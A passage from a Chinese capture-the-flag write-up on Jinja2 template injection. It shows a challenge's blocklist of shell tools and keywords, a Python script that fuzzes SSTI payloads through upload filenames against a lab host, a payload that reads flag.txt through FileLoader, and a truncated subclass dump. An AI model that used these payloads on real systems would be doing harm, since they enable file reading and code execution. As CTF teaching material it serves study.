class="string">&#x27;latexmk&#x27;</span>, <span class="string">&#x27;ld.so&#x27;</span>, <span class="string">&#x27;ldconfig&#x27;</span>, <span class="string">&#x27;less&#x27;</span>, <span class="string">&#x27;less &#x27;</span>, <span class="string">&#x27;lftp&#x27;</span>, <span class="string">&#x27;loginctl&#x27;</span>, <span class="string">&#x27;logsave&#x27;</span>, <span class="string">&#x27;look&#x27;</span>, <span class="string">&#x27;ltrace&#x27;</span>, <span class="string">&#x27;lua&#x27;</span>, <span class="string">&#x27;lualatex&#x27;</span>, <span class="string">&#x27;luatex&#x27;</span>, <span class="string">&#x27;lwp-download&#x27;</span>, <span class="string">&#x27;lwp-request&#x27;</span>, <span class="string">&#x27;mail&#x27;</span>, <span class="string">&#x27;make&#x27;</span>, <span class="string">&#x27;man&#x27;</span>, <span class="string">&#x27;mawk&#x27;</span>, <span class="string">&#x27;more&#x27;</span>, <span class="string">&#x27;mosquitto&#x27;</span>, <span class="string">&#x27;mount&#x27;</span>, <span class="string">&#x27;msfconsole&#x27;</span>, <span class="string">&#x27;msgattrib&#x27;</span>, <span class="string">&#x27;msgcat&#x27;</span>, <span class="string">&#x27;msgconv&#x27;</span>, <span class="string">&#x27;msgfilter&#x27;</span>, <span class="string">&#x27;msgmerge&#x27;</span>, <span class="string">&#x27;msguniq&#x27;</span>, <span class="string">&#x27;mtr&#x27;</span>, <span class="string">&#x27;multitime&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;nano&#x27;</span>, <span class="string">&#x27;nasm&#x27;</span>, <span class="string">&#x27;nawk&#x27;</span>, <span class="string">&#x27;ncftp&#x27;</span>, <span class="string">&#x27;neofetch&#x27;</span>, <span class="string">&#x27;netstat&#x27;</span>, <span class="string">&#x27;nft&#x27;</span>, <span class="string">&#x27;nice&#x27;</span>, <span class="string">&#x27;nmap&#x27;</span>, <span class="string">&#x27;node&#x27;</span>, <span class="string">&#x27;nohup&#x27;</span>, <span class="string">&#x27;npm&#x27;</span>, <span class="string">&#x27;nroff&#x27;</span>, <span class="string">&#x27;nsenter&#x27;</span>, <span class="string">&#x27;nslookup&#x27;</span>, <span class="string">&#x27;octave&#x27;</span>, <span class="string">&#x27;openssl&#x27;</span>, <span class="string">&#x27;openvpn&#x27;</span>, <span class="string">&#x27;openvt&#x27;</span>, <span class="string">&#x27;opkg&#x27;</span>, <span class="string">&#x27;pandoc&#x27;</span>, <span class="string">&#x27;paste&#x27;</span>, <span class="string">&#x27;pax&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pdflatex&#x27;</span>, <span class="string">&#x27;pdftex&#x27;</span>, <span class="string">&#x27;perf&#x27;</span>, <span class="string">&#x27;perl&#x27;</span>, <span class="string">&#x27;perlbug&#x27;</span>, <span class="string">&#x27;pexec&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;pic&#x27;</span>, <span class="string">&#x27;pico&#x27;</span>, <span class="string">&#x27;pidstat&#x27;</span>, <span class="string">&#x27;ping&#x27;</span>, <span class="string">&#x27;pip&#x27;</span>, <span class="string">&#x27;pkexec&#x27;</span>, <span class="string">&#x27;pkg&#x27;</span>, <span class="string">&#x27;posh&#x27;</span>, <span class="string">&#x27;pry&#x27;</span>, <span class="string">&#x27;psftp&#x27;</span>, <span class="string">&#x27;psql&#x27;</span>, <span class="string">&#x27;ptx&#x27;</span>, <span class="string">&#x27;puppet&#x27;</span>, <span class="string">&#x27;pwsh&#x27;</span>, <span class="string">&#x27;rake&#x27;</span>, <span class="string">&#x27;readelf&#x27;</span>, <span class="string">&#x27;red&#x27;</span>, <span class="string">&#x27;redcarpet&#x27;</span>, <span class="string">&#x27;redis&#x27;</span>, <span class="string">&#x27;restic&#x27;</span>, <span class="string">&#x27;rev&#x27;</span>, <span class="string">&#x27;rlogin&#x27;</span>, <span class="string">&#x27;rlwrap&#x27;</span>, <span class="string">&#x27;route&#x27;</span>, <span class="string">&#x27;rpm&#x27;</span>, <span class="string">&#x27;rpmdb&#x27;</span>, <span class="string">&#x27;rpmquery&#x27;</span>, <span class="string">&#x27;rpmverify&#x27;</span>, <span class="string">&#x27;rsync&#x27;</span>, <span class="string">&#x27;rtorrent&#x27;</span>, <span class="string">&#x27;ruby&#x27;</span>, <span class="string">&#x27;run-mailcap&#x27;</span>, <span class="string">&#x27;run-parts&#x27;</span>, <span class="string">&#x27;rview&#x27;</span>, <span class="string">&#x27;rvim&#x27;</span>, <span class="string">&#x27;sash&#x27;</span>, <span class="string">&#x27;scanmem&#x27;</span>, <span class="string">&#x27;scp&#x27;</span>, <span class="string">&#x27;screen&#x27;</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;scrot&#x27;</span>, <span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;service&#x27;</span>, <span class="string">&#x27;setarch&#x27;</span>, <span class="string">&#x27;setfacl&#x27;</span>, <span class="string">&#x27;setlock&#x27;</span>, <span class="string">&#x27;sftp&#x27;</span>, <span class="string">&#x27;shuf&#x27;</span>, <span class="string">&#x27;slsh&#x27;</span>, <span class="string">&#x27;smbclient&#x27;</span>, <span class="string">&#x27;snap&#x27;</span>, <span class="string">&#x27;socat&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;soelim&#x27;</span>, <span class="string">&#x27;softlimit&#x27;</span>, <span class="string">&#x27;sort&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sqlmap&#x27;</span>, <span class="string">&#x27;ssh&#x27;</span>, <span class="string">&#x27;ssh-agent&#x27;</span>, <span class="string">&#x27;ssh-keygen&#x27;</span>, <span class="string">&#x27;ssh-keyscan&#x27;</span>, <span class="string">&#x27;sshpass&#x27;</span>, <span class="string">&#x27;start-stop-daemon&#x27;</span>, <span class="string">&#x27;stdbuf&#x27;</span>, <span class="string">&#x27;strace&#x27;</span>, <span class="string">&#x27;strings&#x27;</span>, <span class="string">&#x27;sysctl&#x27;</span>, <span class="string">&#x27;systemctl&#x27;</span>, <span class="string">&#x27;systemd-resolve&#x27;</span>, <span class="string">&#x27;tac&#x27;</span>, <span class="string">&#x27;tail&#x27;</span>, <span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;task&#x27;</span>, <span class="string">&#x27;taskset&#x27;</span>, <span class="string">&#x27;tasksh&#x27;</span>, <span class="string">&#x27;tbl&#x27;</span>, <span class="string">&#x27;tclsh&#x27;</span>, <span class="string">&#x27;tcpdump&#x27;</span>, <span class="string">&#x27;tdbtool&#x27;</span>, <span class="string">&#x27;tee&#x27;</span>, <span class="string">&#x27;telnet&#x27;</span>, <span class="string">&#x27;tex&#x27;</span>, <span class="string">&#x27;tftp&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;timedatectl&#x27;</span>, <span class="string">&#x27;timeout&#x27;</span>, <span class="string">&#x27;tmate&#x27;</span>, <span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;top&#x27;</span>, <span class="string">&#x27;torify&#x27;</span>, <span class="string">&#x27;torsocks&#x27;</span>, <span class="string">&#x27;touch&#x27;</span>, <span class="string">&#x27;traceroute&#x27;</span>, <span class="string">&#x27;troff&#x27;</span>, <span class="string">&#x27;truncate&#x27;</span>, <span class="string">&#x27;tshark&#x27;</span>, <span class="string">&#x27;unexpand&#x27;</span>, <span class="string">&#x27;uniq&#x27;</span>, <span class="string">&#x27;unshare&#x27;</span>, <span class="string">&#x27;unzip&#x27;</span>, <span class="string">&#x27;update-alternatives&#x27;</span>, <span class="string">&#x27;uudecode&#x27;</span>, <span class="string">&#x27;uuencode&#x27;</span>, <span class="string">&#x27;vagrant&#x27;</span>, <span class="string">&#x27;valgrind&#x27;</span>, <span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;vigr&#x27;</span>, <span class="string">&#x27;vim&#x27;</span>, <span class="string">&#x27;vimdiff&#x27;</span>, <span class="string">&#x27;vipw&#x27;</span>, <span class="string">&#x27;virsh&#x27;</span>, <span class="string">&#x27;volatility&#x27;</span>, <span class="string">&#x27;w3m&#x27;</span>, <span class="string">&#x27;wall&#x27;</span>, <span class="string">&#x27;watch&#x27;</span>, <span class="string">&#x27;wget&#x27;</span>, <span class="string">&#x27;whiptail&#x27;</span>, <span class="string">&#x27;whois&#x27;</span>, <span class="string">&#x27;wireshark&#x27;</span>, <span class="string">&#x27;wish&#x27;</span>, <span class="string">&#x27;xargs&#x27;</span>, <span class="string">&#x27;xdotool&#x27;</span>, <span class="string">&#x27;xelatex&#x27;</span>, <span class="string">&#x27;xetex&#x27;</span>, <span class="string">&#x27;xmodmap&#x27;</span>, <span class="string">&#x27;xmore&#x27;</span>, <span class="string">&#x27;xpad&#x27;</span>, <span class="string">&#x27;xxd&#x27;</span>, <span class="string">&#x27;yarn&#x27;</span>, <span class="string">&#x27;yash&#x27;</span>, <span class="string">&#x27;yelp&#x27;</span>, <span class="string">&#x27;yum&#x27;</span>, <span class="string">&#x27;zathura&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;zsh&#x27;</span>, <span class="string">&#x27;zsoelim&#x27;</span>, <span class="string">&#x27;zypper&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> l1:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> template.lower():</span><br><span class="line">                <span class="built_in">print</span>(template, i, file=sys.stderr)</span><br><span class="line">                template = <span class="string">&quot;nice try&quot;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        matches = re.findall(<span class="string">r&quot;[&#x27;\&quot;](.*?)[&#x27;\&quot;]&quot;</span>, template)</span><br><span class="line">        <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">            <span class="built_in">print</span>(<span class="keyword">match</span>, file=sys.stderr)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> re.<span class="keyword">match</span>(<span class="string">r&#x27;^[a-zA-Z0-9 \/\.\-]+$&#x27;</span>, <span class="keyword">match</span>):</span><br><span class="line">                template = <span class="string">&quot;nice try&quot;</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> l2:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> <span class="keyword">match</span>.lower():</span><br><span class="line">                    <span class="built_in">print</span>(i, file=sys.stderr)</span><br><span class="line">                    template = <span class="string">&quot;nice try&quot;</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></figure></p>
<p>过滤的字符有<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;+&#x27;, &#x27;&#123;&#123;&#x27;, &#x27;&#125;&#125;&#x27;, &#x27;[2]&#x27;, &#x27;flask&#x27;, &#x27;os&#x27;,&#x27;config&#x27;, &#x27;subprocess&#x27;, &#x27;debug&#x27;, &#x27;read&#x27;, &#x27;write&#x27;, &#x27;exec&#x27;, &#x27;popen&#x27;, &#x27;import&#x27;, &#x27;request&#x27;, &#x27;|&#x27;, &#x27;join&#x27;, &#x27;attr&#x27;, &#x27;globals&#x27;, &#x27;\\&#x27;]</span><br></pre></td></tr></table></figure><br>可以用<code>&#123;% print() %&#125;</code>语句</p>
<p>fuzz找可利用类:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://node5.anna.nssctf.cn:28326//upload&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;multipart/form-data; boundary=----WebKitFormBoundary8ALIn5Z2C3VlBqND&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;session=eyJleHQiOm51bGwsInV1aWQiOiJlOTFkMWZhYS1iZDEzLTQ0MTctODQ4YS0wYWUxNmRlYjlmZGEifQ.ZRAzUg.SaZGZzG8nBbt3ZS2lHgdn-OtDAk&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#123;% print([].__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]) %&#125;&#x27;</span></span><br><span class="line">    data = <span class="string">f&#x27;&#x27;&#x27;------WebKitFormBoundary8ALIn5Z2C3VlBqND</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">test</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundary8ALIn5Z2C3VlBqND--</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">    response = requests.post(url, headers=headers, data=data)</span><br><span class="line">    <span class="comment">#print(response.text)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;_frozen_importlib_external.FileLoader&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="built_in">print</span>(response.text)</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><br>找到类的位置为99<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% print([].__class__.__base__.__subclasses__()[99].get_data(0,&#x27;flag.txt&#x27;)) %&#125;</span><br></pre></td></tr></table></figure><br>直接读取<br><img src="https://s2.loli.net/2023/09/24/8duWGg3wQpq4OeK.png" alt="image.png"></p>
<h3 id="SEETF-2023-File-Uploader-2"><a href="#SEETF-2023-File-Uploader-2" class="headerlink" title="[SEETF 2023]File Uploader 2"></a>[SEETF 2023]File Uploader 2</h3><p>这题的ssti点在/uploads/<path:path>,随便写的payload命名为图片后缀,访问图片自动执行payload<br>fuzz:<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure><br>找warnings.catch_warnings:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">classes=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;dict_reversekeyiterator&#x27;&gt;, &lt;class &#x27;dict_reversevalueiterator&#x27;&gt;, &lt;class &#x27;dict_reverseitemiterator&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;, &lt;class &#x27;reversed&#x27;&gt;, &lt;class &#x27;stderrprinter&#x27;&gt;, &lt;class &#x27;code&#x27;&gt;, &lt;class &#x27;frame&#x27;&gt;, &lt;class &#x27;builtin_function_or_method&#x27;&gt;, &lt;class &#x27;method&#x27;&gt;, &lt;class &#x27;function&#x27;&gt;, &lt;class &#x27;mappingproxy&#x27;&gt;, &lt;class &#x27;generator&#x27;&gt;, &lt;class &#x27;getset_descriptor&#x27;&gt;, &lt;class &#x27;wrapper_descriptor&#x27;&gt;, &lt;class &#x27;method-wrapper&#x27;&gt;, &lt;class &#x27;ellipsis&#x27;&gt;, &lt;class &#x27;member_descriptor&#x27;&gt;, &lt;class &#x27;types.SimpleNamespace&#x27;&gt;, &lt;class &#x27;PyCapsule&#x27;&gt;, &lt;class &#x27;longrange_iterator&#x27;&gt;, &lt;class &#x27;cell&#x27;&gt;, &lt;class &#x27;instancemethod&#x27;&gt;, &lt;class &#x27;classmethod_descriptor&#x27;&gt;, &lt;class &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;callable_iterator&#x27;&gt;, &lt;class &#x27;iterator&#x27;&gt;, &lt;class &#x27;pickle.PickleBuffer&#x27;&gt;, &lt;class &#x27;coroutine&#x27;&gt;, &lt;class &#x27;coroutine_wrapper&#x27;&gt;, &lt;class &#x27;InterpreterID&#x27;&gt;, &lt;class &#x27;EncodingMap&#x27;&gt;, &lt;class &#x27;fieldnameiterator&#x27;&gt;, &lt;class &#x27;formatteriterator&#x27;&gt;, &lt;class &#x27;BaseException&#x27;&gt;, &lt;class &#x27;hamt&#x27;&gt;, &lt;class &#x27;hamt_array_node&#x27;&gt;, &lt;class &#x27;hamt_bitmap_node&#x27;&gt;, &lt;class &#x27;hamt_collision_node&#x27;&gt;, &lt;class &#x27;keys&#x27;&gt;, &lt;class &#x27;values&#x27;&gt;, &lt;class &#x27;items&#x27;&gt;, &lt;class &#x27;Context&#x27;&gt;, &lt;class &#x27;ContextVar&#x27;&gt;, &lt;class &#x27;Token&#x27;&gt;, &lt;class &#x27;Token.MISSING&#x27;&gt;, &lt;class &#x27;moduledef&#x27;&gt;, &lt;class &#x27;module&#x27;&gt;, &lt;class &#x27;filter&#x27;&gt;, &lt;class &#x27;map&#x27;&gt;, &lt;class &#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.Annotated&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.TypedDict&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;ast.AST&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;_struct.Struct&#x27;&gt;, &lt;class &#x27;_struct.unpack_iterator&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_hashlib.HMAC&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class 